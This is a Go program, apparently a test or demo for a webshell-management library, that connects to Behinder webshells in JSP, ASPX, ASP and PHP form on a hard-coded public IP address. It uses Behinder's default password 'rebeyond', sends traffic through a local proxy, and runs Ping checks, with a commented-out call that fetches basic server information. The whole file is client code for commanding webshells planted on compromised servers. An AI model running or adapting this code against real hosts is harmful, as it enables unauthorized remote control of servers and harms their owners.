package main

import (
	"fmt"
	"github.com/Go0p/wsm"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/shell/behinder"
	"log"
)

const (
	// JspIndexShellUrl 测试输出存在干扰字符的情况
	JspIndexShellUrl = "http://139.196.175.86:8080/bxindex.jsp"
	JspShellUrl      = "http://139.196.175.86:8080/bx.jsp"
	CsharpShellUrl   = "http://139.196.175.86:8081/bx.aspx"
	AspShellUrl      = "http://139.196.175.86:8081/bx.asp"
	PhpShellUrl      = "http://139.196.175.86/bx.php"
)

func main() {
	log.SetFlags(log.Lshortfile)
	log.Println("Jsp")
	testJsp()
	log.Println("Aspx")
	testAspx()
	log.Println("Asp")
	testAsp()
	log.Println("Php")
	testPhp()
}

func testPhp() {
	info := wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      PhpShellUrl,
			Password: "rebeyond",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx := wsm.NewBehinder(info)
	i := bx.Ping()
	fmt.Println(i)
}

func testAsp() {
	info := wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspShellUrl,
			Password: "rebeyond",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx := wsm.NewBehinder(info)

	i := bx.Ping()
	fmt.Println(i)
}

func testAspx() {
	info := wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      CsharpShellUrl,
			Password: "rebeyond",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		},
	}
	bx := wsm.NewBehinder(info)

	i := bx.Ping()
	fmt.Println(i)
}

func testJsp() {
	info := wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspShellUrl,
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx := wsm.NewBehinder(info)
	p := &behinder.PingParams{
		// response 结果不加密测试
		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
		Content:        "xxxxxxx",
	}
	i := bx.Ping(p)
	fmt.Println(i)
	//z := &behinder.BasicInfoParams{
	//	OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
	//	WhatEver:       "xxxxxxx",
	//}
	//b := bx.BasicInfo(z)
	//fmt.Println(b)
}
